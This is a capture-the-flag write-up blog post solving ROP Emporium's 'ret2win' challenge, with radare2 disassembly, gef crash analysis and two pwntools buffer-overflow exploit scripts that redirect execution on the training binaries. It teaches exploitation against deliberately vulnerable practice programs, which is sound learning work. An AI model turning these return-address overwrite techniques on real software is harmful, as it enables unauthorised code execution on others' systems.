---
layout: post
title: 	"ROP Emporium: All Challenges"
date:	2019-07-19 20:52:55 +0800
categories: writeups rop-emporium
---

<div class="toc-container">
  <ul id="markdown-toc">
    <li><a href="#ret2win" id="markdown-toc-h1-header">ret2win</a>
    <ul>
        <li><a href="#32-bit" id="markdown-toc-h3-header">32-bit</a></li>
        <li><a href="#64-bit" id="markdown-toc-h3-header">64-bit</a></li>
    </ul>
    </li>
  </ul>
</div>

# Introduction

[ROP Emporium](https://ropemporium.com/) is a website that hosts a set of challenges intended to teach Return Oriented Programming, which is a technique used in binary exploitation. This post will showcase my solutions to all the challenges. I will make heavy use of the following tools:

* gdb gef
* pwntools
* ropper

The challenges are all listed in sequential order as shown on ROP Emporium's website. It is ordered by increasing difficulty.

Disclaimer: I will make an assumption that anyone reading this is familiar with the basics of binary exploitation, and will skip explaining a lot of the very simple things. You should also know how to read assembly.

# ret2win

### 32-bit

To start off with, let's run a checksec on the given binary:

```shell
root@kali:~/Documents/ropemporium/ret2win/32ret2win# checksec ./ret2win
[*] '/root/Documents/ropemporium/ret2win/32ret2win/ret2win'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Explanation:

* **Arch: i386-32-little:** This means this is a 32-bit binary compiled on a little-endian system.
* **RELRO: Partial RELRO:** A detailed explanation on what RELRO is can be found [here](https://ctf101.org/binary-exploitation/relocation-read-only/).
* **Stack: No canary found:** Stack canaries are a feature that programs can use to protect against buffer overflows. More information [here](https://ctf101.org/binary-exploitation/stack-canaries/).
* **NX: NX enabled:** NX means Not Executable. This just means that the stack is not executable, meaning we can't just place our own malicious shellcode on the stack and execute it.
* **PIE: No PIE (0x8048000):** PIE means Position Independent Executable. PIE being enabled is synonymous with ASLR being enabled. More information about PIE (and by extension, ASLR) can be found [here](https://ctf101.org/binary-exploitation/address-space-layout-randomization/).

First things first, open the binary up in radare2, analyze it, and see what we can see.
```shell
root@kali:~/Documents/ropemporium/ret2win/32ret2win# r2 ./ret2win 
[0x08048480]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
[0x08048480]> afl
0x080483c0    3 35           sym._init
0x08048400    1 6            sym.imp.printf
0x08048410    1 6            sym.imp.fgets
0x08048420    1 6            sym.imp.puts
0x08048430    1 6            sym.imp.system
0x08048440    1 6            sym.imp.__libc_start_main
0x08048450    1 6            sym.imp.setvbuf
0x08048460    1 6            sym.imp.memset
0x08048470    1 6            sub.__gmon_start_8048470
0x08048480    1 33           entry0
0x080484b0    1 4            sym.__x86.get_pc_thunk.bx
0x080484c0    4 43           sym.deregister_tm_clones
0x080484f0    4 53           sym.register_tm_clones
0x08048530    3 30           sym.__do_global_dtors_aux
0x08048550    4 43   -> 40   entry.init0
0x0804857b    1 123          sym.main
0x080485f6    1 99           sym.pwnme
0x08048659    1 41           sym.ret2win
0x08048690    4 93           sym.__libc_csu_init
0x080486f0    1 2            sym.__libc_csu_fini
0x080486f4    1 20           sym._fini
[0x08048480]> 
```

The important functions are `sym.main`, `sym.pwnme`, and `sym.ret2win`. The important bits of the main function is shown below:
```shell
[0x08048480]> s sym.main
[0x0804857b]> pdf
            ;-- main:
/ (fcn) sym.main 123
|   sym.main (int argc, char **argv, char **envp);
|           ; var int local_4h @ ebp-0x4
|           ; arg int arg_4h @ esp+0x4
|           ; DATA XREF from entry0 (0x8048497)
|           ...
|           0x080485b7      6810870408     push str.ret2win_by_ROP_Emporium ; 0x8048710 ; "ret2win by ROP Emporium"
|           0x080485bc      e85ffeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x080485c1      83c410         add esp, 0x10
|           0x080485c4      83ec0c         sub esp, 0xc
|           0x080485c7      6828870408     push str.32bits             ; 0x8048728 ; "32bits\n"
|           0x080485cc      e84ffeffff     call sym.imp.puts           ; int puts(const char *s)
|           0x080485d1      83c410         add esp, 0x10
|           0x080485d4      e81d000000     call sym.pwnme
|           0x080485d9      83ec0c         sub esp, 0xc
|           0x080485dc      6830870408     push str.Exiting            ; 0x8048730 ; "\nExiting"
|           0x080485e1      e83afeffff     call sym.imp.puts           ; int puts(const char *s)
|           ...
[0x0804857b]> 

```

So the main function basically uses `puts()` to output a bunch of text, then calls the `pwnme()` function. Let's see what `pwnme()` does.
```shell
[0x0804857b]> s sym.pwnme
[0x080485f6]> pdf
/ (fcn) sym.pwnme 99
|   sym.pwnme ();
|           ; var int local_28h @ ebp-0x28
|           ; CALL XREF from sym.main (0x80485d4)
|           0x080485f6      55             push ebp
|           0x080485f7      89e5           mov ebp, esp
|           0x080485f9      83ec28         sub esp, 0x28               ; '('
|           0x080485fc      83ec04         sub esp, 4
|           0x080485ff      6a20           push 0x20                   ; 32
|           0x08048601      6a00           push 0
|           0x08048603      8d45d8         lea eax, dword [local_28h]
|           0x08048606      50             push eax
|           0x08048607      e854feffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x0804860c      83c410         add esp, 0x10
|           0x0804860f      83ec0c         sub esp, 0xc
|           0x08048612      683c870408     push str.For_my_first_trick__I_will_attempt_to_fit_50_bytes_of_user_input_into_32_bytes_of_stack_buffer___What_could_possibly_go_wrong ; 0x804873c ; "For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\nWhat could possibly go wrong?"
|           0x08048617      e804feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x0804861c      83c410         add esp, 0x10
|           0x0804861f      83ec0c         sub esp, 0xc
|           0x08048622      68bc870408     push str.You_there_madam__may_I_have_your_input_please__And_don_t_worry_about_null_bytes__we_re_using_fgets ; 0x80487bc ; "You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n"
|           0x08048627      e8f4fdffff     call sym.imp.puts           ; int puts(const char *s)
|           0x0804862c      83c410         add esp, 0x10
|           0x0804862f      83ec0c         sub esp, 0xc
|           0x08048632      6821880408     push 0x8048821
|           0x08048637      e8c4fdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x0804863c      83c410         add esp, 0x10
|           0x0804863f      a160a00408     mov eax, dword [obj.stdin__GLIBC_2.0] ; [0x804a060:4]=0
|           0x08048644      83ec04         sub esp, 4
|           0x08048647      50             push eax
|           0x08048648      6a32           push 0x32                   ; '2' ; 50
|           0x0804864a      8d45d8         lea eax, dword [local_28h]
|           0x0804864d      50             push eax
|           0x0804864e      e8bdfdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x08048653      83c410         add esp, 0x10
|           0x08048656      90             nop
|           0x08048657      c9             leave
\           0x08048658      c3             ret
[0x080485f6]> 
```

Here is where the buffer overflow lies. We can already see the text says "I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer". The buffer `local_28h` is initialized to a size of 0x20 bytes at instruction `0x08048607`. `fgets()` is then called with a size of 0x32 bytes at instruction `0x0804864e`.

The last function we have to check is `ret2win()`.
```shell
[0x080485f6]> s sym.ret2win
[0x08048659]> pdf
/ (fcn) sym.ret2win 41
|   sym.ret2win ();
|           0x08048659      55             push ebp
|           0x0804865a      89e5           mov ebp, esp
|           0x0804865c      83ec08         sub esp, 8
|           0x0804865f      83ec0c         sub esp, 0xc
|           0x08048662      6824880408     push str.Thank_you__Here_s_your_flag: ; 0x8048824 ; "Thank you! Here's your flag:"
|           0x08048667      e894fdffff     call sym.imp.printf         ; int printf(const char *format)
|           0x0804866c      83c410         add esp, 0x10
|           0x0804866f      83ec0c         sub esp, 0xc
|           0x08048672      6841880408     push str.bin_cat_flag.txt   ; 0x8048841 ; "/bin/cat flag.txt"
|           0x08048677      e8b4fdffff     call sym.imp.system         ; int system(const char *string)
|           0x0804867c      83c410         add esp, 0x10
|           0x0804867f      90             nop
|           0x08048680      c9             leave
\           0x08048681      c3             ret
[0x08048659]> 
```
It's a tiny function that just calls `system("/bin/cat flag.txt")`. This is the function we want to jump to. Seems easy enough.

Now that we know what to do, let's crash the binary and see where it crashes. I like to use gdb gef for this as it has its own built in `pattern create` and `pattern offset` shown below.

```shell
gef➤  pattern create 50
[+] Generating a pattern of 50 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
[+] Saved as '$_gef0'
gef➤  run
Starting program: /root/Documents/ropemporium/ret2win/32ret2win/ret2win 
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd270  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaam"
$ebx   : 0x0       
$ecx   : 0xf7fac89c  →  0x00000000
$edx   : 0xffffd270  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaam"
$esp   : 0xffffd2a0  →  0xf7fe006d  →   add BYTE PTR [esi-0x70], ah
$ebp   : 0x6161616b ("kaaa"?)
$esi   : 0xf7fab000  →  0x001d9d6c
$edi   : 0xf7fab000  →  0x001d9d6c
$eip   : 0x6161616c ("laaa"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd2a0│+0x0000: 0xf7fe006d  →   add BYTE PTR [esi-0x70], ah  ← $esp
0xffffd2a4│+0x0004: 0xffffd2c0  →  0x00000001
0xffffd2a8│+0x0008: 0x00000000
0xffffd2ac│+0x000c: 0xf7debb41  →  <__libc_start_main+241> add esp, 0x10
0xffffd2b0│+0x0010: 0xf7fab000  →  0x001d9d6c
0xffffd2b4│+0x0014: 0xf7fab000  →  0x001d9d6c
0xffffd2b8│+0x0018: 0x00000000
0xffffd2bc│+0x001c: 0xf7debb41  →  <__libc_start_main+241> add esp, 0x10
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616c
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win", stopped, reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  patter offset 0x6161616c 50
[+] Searching '0x6161616c'
[+] Found at offset 44 (little-endian search) likely
[+] Found at offset 41 (big-endian search) 
gef➤
```

Quick exploit script written in python.
```python
#!/usr/bin/env python

from pwn import *

context.log_level = 'critical'

elf = ELF("./ret2win")

ret2win_addr = elf.symbols['ret2win']

payload = "A"*44
payload += p32(ret2win_addr)

sh = elf.process()

sh.recvuntil('> ')
sh.sendline(payload)

sh.interactive()
```

And then, the flag.

```shell
root@kali:~/Documents/ropemporium/ret2win/32ret2win# chmod +x exploit.py
root@kali:~/Documents/ropemporium/ret2win/32ret2win# ./exploit.py 
Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
$ 
```

### 64-bit

The 64-bit binary is set out the exact same as the 32-bit one, so I will skip looking at the assembly for this one.

The one difference that can be seen is from the gdb output shown below.
```shell
gef➤  pattern create 50
[+] Generating a pattern of 50 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
[+] Saved as '$_gef0'
gef➤  run
Starting program: /root/Documents/ropemporium/ret2win/64ret2win/ret2win 
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400810 in pwnme ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffe0f0  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaag"
$rbx   : 0x0               
$rcx   : 0xfbad2288        
$rdx   : 0x00007fffffffe0f0  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaag"
$rsp   : 0x00007fffffffe118  →  "faaaaaaag"
$rbp   : 0x6161616161616165 ("eaaaaaaa"?)
$rsi   : 0x00007ffff7fac8d0  →  0x0000000000000000
$rdi   : 0x00007fffffffe0f1  →  "aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaag"
$rip   : 0x0000000000400810  →  <pwnme+91> ret 
$r8    : 0x0               
$r9    : 0x00007ffff7fb1500  →  0x00007ffff7fb1500  →  [loop detected]
$r10   : 0x0000000000602010  →  0x0000000000000000
$r11   : 0x246             
$r12   : 0x0000000000400650  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffe200  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe118│+0x0000: "faaaaaaag"  ← $rsp
0x00007fffffffe120│+0x0008: 0x0000000000400067  →   add al, bh
0x00007fffffffe128│+0x0010: 0x00007ffff7e1309b  →  <__libc_start_main+235> mov edi, eax
0x00007fffffffe130│+0x0018: 0x0000000000000000
0x00007fffffffe138│+0x0020: 0x00007fffffffe208  →  0x00007fffffffe4e4  →  "/root/Documents/ropemporium/ret2win/64ret2win/ret2[...]"
0x00007fffffffe140│+0x0028: 0x0000000100000000
0x00007fffffffe148│+0x0030: 0x0000000000400746  →  <main+0> push rbp
0x00007fffffffe150│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400809 <pwnme+84>       call   0x400620 <fgets@plt>
     0x40080e <pwnme+89>       nop    
     0x40080f <pwnme+90>       leave  
 →   0x400810 <pwnme+91>       ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win", stopped, reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400810 → pwnme()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset 0x6161616161616165 50
[+] Searching '0x6161616161616165'
[+] Found at offset 32 (little-endian search) likely
[+] Found at offset 25 (big-endian search) 
gef➤ 
```

We see that we don't overwrite RIP at all. This is because we overwrote RIP with an invalid address of `0x4141414141414141`, which is greater than the maximum address size of `0x00007fffffffffff`. This causes the OS to raise an exception and thus not update RIP's value at all.

However, we did overwrite RBP, and we know that the RIP exists 8 bytes past RBP's address. Finding the offset for RIP (32) then adding 8 to it, gives us the offset for RIP, which is 40.

Note that we still have control of RIP, it's just that we can't write an invalid address to it. Fortunately, the address to the `ret2win()` function is a valid address, so the following script does the job.

```python
#!/usr/bin/env python

from pwn import *

context.log_level = 'critical'

elf = ELF("./ret2win")

ret2win_addr = elf.symbols['ret2win']

payload = "A"*40
payload += p64(ret2win_addr)

sh = elf.process()

sh.recvuntil('> ')
sh.sendline(payload)

sh.interactive()
```

Easy.
```shell
root@kali:~/Documents/ropemporium/ret2win/64ret2win# chmod +x exploit.py
root@kali:~/Documents/ropemporium/ret2win/64ret2win# ./exploit.py
Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
$ 
```